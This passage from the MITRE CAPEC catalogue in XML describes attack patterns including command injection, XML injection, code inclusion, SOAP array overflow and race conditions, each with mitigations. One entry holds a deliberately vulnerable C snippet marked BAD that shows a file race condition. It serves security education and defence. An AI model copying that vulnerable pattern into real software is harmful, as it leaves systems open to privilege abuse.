         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>Design: Use libraries and templates that minimize unfiltered input.</Mitigation>
            <Mitigation>Implementation: Normalize, filter and white list any input that will be included in any subsequent web pages or back end operations.</Mitigation>
            <Mitigation>Implementation: The victim should configure the browser to minimize active content from untrusted sources.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="86"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Description Summary, Related_Attack_Patterns, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-05-01">Cross-Site Scripting with Masking through Invalid Characters in Identifiers</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="248" Name="Command Injection" Abstraction="Meta" Status="Stable">
         <Description>An adversary looking to execute a command of their choosing, injects new items into an existing command thus modifying interpretation away from what was intended. Commands in this context are often standalone strings that are interpreted by a downstream component and cause specific responses. This type of attack is possible when untrusted values are used to build these command strings. Weaknesses in input validation or command construction can enable the attack and lead to successful exploitation.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The target application must accept input from the user and then use this input in the construction of commands to be executed. In virtually all cases, this is some form of string input that is concatenated to a constant string defined by the application to form the full command to be executed.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>A successful command injection attack enables an adversary to alter the command being executed and achieve a variety of negative consequences depending on the makeup of the new command. This includes potential information disclosure or the corruption of application data.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>All user-controllable input should be validated and filtered for potentially unwanted characters. Whitelisting input is desired, but if a blacklisting approach is necessary, then focusing on command related terms and delimiters is necessary.</Mitigation>
            <Mitigation>Input should be encoded prior to use in commands to make sure command related characters are not treated as part of the command. For example, quotation characters may need to be encoded so that the application does not treat the quotation as a delimiter.</Mitigation>
            <Mitigation>Input should be parameterized, or restricted to data sections of a command, thus removing the chance that the input will be treated as part of the command itself.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="77"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description, Description Summary, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="25" Name="Forced Deadlock" Abstraction="Meta" Status="Stable">
         <Description>The adversary triggers and exploits a deadlock condition in the target software to cause a denial of service. A deadlock can occur when two or more competing actions are waiting for each other to finish, and thus neither ever does. Deadlock conditions can be difficult to detect.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>The adversary initiates an exploratory phase to get familiar with the system.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>The adversary triggers a first action (such as holding a resource) and initiates a second action which will wait for the first one to finish.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Explore</Phase>
               <Description>If the target program has a deadlock condition, the program waits indefinitely resulting in a denial of service.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target host has a deadlock condition. There are four conditions for a deadlock to occur, known as the Coffman conditions. [R.25.3][REF-6]</Prerequisite>
            <Prerequisite>The target host exposes an API to the user.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">This type of attack may be sophisticated and require knowledge about the system's resources and APIs.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Resource Consumption</Impact>
               <Note>A successful forced deadlock attack compromises the availability of the system by exhausting its available resources.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use known algorithm to avoid deadlock condition (for instance non-blocking synchronization algorithms).</Mitigation>
            <Mitigation>For competing actions, use well-known libraries which implement synchronization.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>An example of a deadlock which may occur in database products is the following. Client applications using the database may require exclusive access to a table, and in order to gain exclusive access they ask for a lock. If one client application holds a lock on a table and attempts to obtain the lock on a second table that is already held by a second client application, this may lead to deadlock if the second application then attempts to obtain the lock that is held by the first application (Source: Wikipedia, http://en.wikipedia.org/wiki/Deadlock)</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="412"/>
            <Related_Weakness CWE_ID="567"/>
            <Related_Weakness CWE_ID="662"/>
            <Related_Weakness CWE_ID="833"/>
            <Related_Weakness CWE_ID="667"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
            <Reference External_Reference_ID="REF-101" Section="Deadlock"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Type (Relationship -&gt; Attack_Pattern)</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Phases, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Probing_Techniques, Related_Weaknesses, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="250" Name="XML Injection" Abstraction="Standard" Status="Draft">
         <Description>An attacker utilizes crafted XML user-controllable input to probe, attack, and inject data into the XML database, using techniques similar to SQL injection. The user-controllable input can allow for unauthorized viewing of data, bypassing authentication or the front-end application for direct XML database access, and possibly altering database information.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="248"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey Application]</Description>
               <Technique>Spider web sites for all available links.</Technique>
               <Technique>Gather results for analysis via responses or network sniffing.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Test user-controllable inputs for injection]</Description>
               <Technique>Use XML reserved characters or words, possibly with other input data to attempt to cause unexpected results</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>XML queries used to process user input and retrieve information stored in XML documents</Prerequisite>
            <Prerequisite>User-controllable input not properly sanitized</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">An attacker must have knowledge of XML syntax and constructs in order to successfully leverage XML Injection</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Indicators>
            <Indicator>Too many exceptions generated by the application as a result of malformed queries</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XML data or a query.</xhtml:p>
               <xhtml:p>Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="91"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="713"/>
            <Related_Weakness CWE_ID="707"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="251" Name="Local Code Inclusion" Abstraction="Standard" Status="Stable">
         <Description>The attacker forces an application to load arbitrary code files from the local machine. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="175"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted application must have a bug that allows an adversary to control which code file is loaded at some juncture.</Prerequisite>
            <Prerequisite>Some variants of this attack may require that old versions of some code files be present and in predictable locations.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The adversary needs to have enough access to the target application to control the identity of a locally included file. The attacker may also need to be able to upload arbitrary code files to the target machine, although any location for these files may be acceptable.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Through local code inclusion, the adversary compromises the integrity of the application.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>An attacker may leverage local code inclusion in order to print sensitive data to a page, such as hidden configuration files or or password hashes.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Implementation: Avoid passing user input to filesystem or framework API. If necessary to do so, implement specific, white-list approach.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="829"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1055</Entry_ID>
               <Entry_Name>Process Injection</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Resources_Required, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="252" Name="PHP Local File Inclusion" Abstraction="Detailed" Status="Draft">
         <Description>The attacker loads and executes an arbitrary local PHP file on a target machine. The attacker could use this to try to load old versions of PHP files that have known vulnerabilities, to load PHP files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="251"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted PHP application must have a bug that allows an attacker to control which code file is loaded at some juncture.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The attacker needs to have enough access to the target application to control the identity of a locally included PHP file.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="829"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="253" Name="Remote Code Inclusion" Abstraction="Standard" Status="Draft">
         <Description>The attacker forces an application to load arbitrary code files from a remote location. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load malicious files that the attacker placed on the remote machine, or to otherwise change the functionality of the targeted application in unexpected ways.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="175"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Target application server must allow remote files to be included.The malicious file must be placed on the remote machine previously.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>Minimize attacks by input validation and sanitization of any user data that will be used by the target application to locate a remote file to be included.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="829"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, Related_Weaknesses, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="256" Name="SOAP Array Overflow" Abstraction="Detailed" Status="Draft">
         <Description>An attacker sends a SOAP request with an array whose actual length exceeds the length indicated in the request. When a data structure including a SOAP array is instantiated, the sender transmits the size of the array as an explicit parameter along with the data. If the server processing the transmission naively trusts the specified size, then an attacker can intentionally understate the size of the array, possibly resulting in a buffer overflow if the server attempts to read the entire data set into the memory it allocated for a smaller array. This, in turn, can lead to a server crash or even the execution of arbitrary code.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted SOAP server must trust that the array size as stated in messages it receives is correct, but read through the entire content of the message regardless of the stated size of the array.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The attacker must be able to craft malformed SOAP messages, specifically, messages with arrays where the stated array size understates the actual size of the array in the message.</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>If the server either verifies the correctness of the stated array size or if the server stops processing an array once the stated number of elements have been read, regardless of the actual array size, then this attack will fail. The former detects the malformed SOAP message while the latter ensures that the server does not attempt to load more data than was allocated for.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="805"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-102"/>
            <Reference External_Reference_ID="REF-103" Section="5.4.2 Arrays"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="26" Name="Leveraging Race Conditions" Abstraction="Meta" Status="Stable">
         <Description>The adversary targets a race condition occurring when multiple processes access and manipulate the same resource concurrently, and the outcome of the execution depends on the particular order in which the access takes place. The adversary can leverage a race condition by "running the race", modifying the resource and modifying the normal execution flow. For instance, a race condition can occur while accessing a file: the adversary can trick the system by replacing the original file with his version and cause the system to read the malicious file.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>The adversary explores to gauge what level of access he has.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>The adversary gains access to a resource on the target host. The adversary modifies the targeted resource. The resource's value is used to determine the next normal execution action.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>The resource is modified/checked concurrently by multiple processes. By using one of the processes, the adversary is able to modify the value just before it is consumed by a different process. A race condition occurs and is exploited by the adversary to abuse the target host.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>A resource is accessed/modified concurrently by multiple processes such that a race condition exists.</Prerequisite>
            <Prerequisite>The adversary has the ability to modify the resource.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Being able to "run the race" requires basic knowledge of concurrent processing including synchonization techniques.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use safe libraries to access resources such as files.</Mitigation>
            <Mitigation>Be aware that improper use of access function calls such as chown(), tempfile(), chmod(), etc. can cause a race condition.</Mitigation>
            <Mitigation>Use synchronization to control the flow of execution.</Mitigation>
            <Mitigation>Use static analysis tools to find race conditions.</Mitigation>
            <Mitigation>Pay attention to concurrency problems related to the access of resources.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>The Net Direct client for Linux before 6.0.5 in Nortel Application Switch 2424, VPN 3050 and 3070, and SSL VPN Module 1000 extracts and executes files with insecure permissions, which allows local users to exploit a race condition to replace a world-writable file in /tmp/NetClient and cause another user to execute arbitrary code when attempting to execute this client, as demonstrated by replacing /tmp/NetClient/client. See also: CVE-2007-1057</Example>
            <Example>
               <xhtml:p>The following code illustrates a file that is accessed multiple times by name in a publicly accessible directory. A race condition exists between the accesses where an attacker can replace the file referenced by the name (see [R.26.5]).</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">include &lt;sys/types.h&gt;<xhtml:br/>include &lt;fcntl.h&gt;<xhtml:br/>include &lt;unistd.h&gt;<xhtml:br/>
                  <xhtml:br/>define FILE "/tmp/myfile"<xhtml:br/>define UID 100<xhtml:br/>
                  <xhtml:br/>void test(char *str)<xhtml:br/>{<xhtml:div style="margin-left:10px;">int fd;<xhtml:br/>fd = creat(FILE, 0644);<xhtml:br/>if(fd == -1)<xhtml:div style="margin-left:10px;">return;</xhtml:div>
                     <xhtml:br/>chown(FILE, UID, -1); /* BAD */<xhtml:br/>close(fd);</xhtml:div>
                  <xhtml:br/>}<xhtml:br/>
                  <xhtml:br/>int main(int argc, char **argv)<xhtml:br/>{<xhtml:div style="margin-left:10px;">char *userstr;<xhtml:br/>if(argc &gt; 1) {<xhtml:div style="margin-left:10px;">userstr = argv[1];<xhtml:br/>test(userstr);</xhtml:div>
                     <xhtml:br/>}<xhtml:br/>return 0;</xhtml:div>
                  <xhtml:br/>}</xhtml:div>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="368"/>
            <Related_Weakness CWE_ID="363"/>
            <Related_Weakness CWE_ID="366"/>
            <Related_Weakness CWE_ID="370"/>
            <Related_Weakness CWE_ID="362"/>
            <Related_Weakness CWE_ID="662"/>
            <Related_Weakness CWE_ID="689"/>
            <Related_Weakness CWE_ID="667"/>
            <Related_Weakness CWE_ID="665"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
            <Reference External_Reference_ID="REF-105" Section="Race condition"/>
            <Reference External_Reference_ID="REF-106"/>
            <Reference External_Reference_ID="REF-107" Section="Test Case ID 1598"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Type (Relationship -&gt; Attack_Pattern)</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Phases, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required, Examples-Instances, References, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="261" Name="Fuzzing for garnering other adjacent user/sensitive data" Abstraction="Detailed" Status="Draft">
         <Description>An attacker who is authorized to send queries to a target sends variants of expected queries in the hope that these modified queries might return information (directly or indirectly through error logs) beyond what the expected set of queries should provide. Many client applications use specific query templates when interacting with a server and often automatically fill in specific fields or attributes. For example, a client that queries an employee database might have templates such that the user only supplies the target's name and the template dictates the fields to be returned (location, position in the company, phone number, etc.). If the server does not verify that the query matches one of the expected templates, an attacker who is allowed to send normal queries could modify their query to try to return additional information. In the above example, additional information might include social security numbers or salaries. Fuzzing techniques involve sending random or malformed messages to a target and monitoring the target's response. In this particular attack, the fuzzing is applied to the format of the expected templates, creating variants that request additional information, exclude limiting clauses, or alter fields that identify the requester in order to subvert access controls. The attacker may not know the names of fields to request or how other modifications will affect the server response, but by attempting multiple plausible variants, they might eventually trigger a server response that divulges sensitive information. Other possible outcomes include server crashes and resource consumption if the unexpected queries cause the server to enter an unstable state or perform excessive computation.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="54"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The server must assume that the queries it receives follow specific templates and/or have fields or attributes that follow specific procedures. The server must process queries that it receives without adequately checking or sanitizing queries to ensure they follow these templates.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The attacker must have sufficient privileges to send queries to the targeted server. A normal client might limit the nature of these queries, so the attacker must either have a modified client or their own application which allows them to modify the expected queries.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="20"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="263" Name="Force Use of Corrupted Files" Abstraction="Detailed" Status="Draft">
         <Description>This describes an attack where an application is forced to use a file that an attacker has corrupted. The result is often a denial of service caused by the application being unable to process the corrupted file, but other results, including the disabling of filters or access controls (if the application fails in an unsafe way rather than failing by locking down) or buffer overflows are possible.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="17"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted application must utilize a configuration file that an attacker is able to corrupt. In some cases, the attacker must be able to force the (re-)reading of the corrupted file if the file is normally only consulted at startup.</Prerequisite>
            <Prerequisite>The severity of the attack hinges on how the application responds to the corrupted file. If the application detects the corruption and locks down, this may result in the denial of services provided by the application. If the application fails to detect the corruption, the result could be a more severe denial of service (crash or hang) or even an exploitable buffer overflow. If the application detects the corruption but fails in an unsafe way, this attack could result in the continuation of services but without certain security structures, such as filters or access controls. For example, if the corrupted file configures filters, an unsafe response from an application could result in simply disabling the filtering mechanisms due to the lack of usable configuration data.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>This varies depending on the resources necessary to corrupt the configuration file and the resources needed to force the application to re-read it (if any).</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="829"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="267" Name="Leverage Alternate Encoding" Abstraction="Standard" Status="Draft">
         <Description>An adversary leverages the possibility to encode potentially harmful input or content used by applications such that the applications are ineffective at validating this encoding standard.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
